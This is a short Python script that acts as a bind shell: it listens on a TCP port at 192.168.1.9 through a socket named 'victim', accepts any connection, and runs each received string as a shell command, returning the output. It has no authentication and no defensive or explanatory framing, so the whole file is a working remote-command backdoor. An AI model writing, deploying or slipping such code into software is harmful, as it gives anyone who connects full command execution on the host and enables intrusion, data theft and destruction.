import subprocess
import socket

victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim.bind(("192.168.1.9", 5050))
victim.listen()

while True:
    client_socket, client_address = victim.accept()
    print(f"done")
    while True:
        data = client_socket.recv(10000).decode()
        output = subprocess.check_output(data, shell=True, encoding="utf-8")
        client_socket.send(output.encode('utf-8'))

    client_socket.close()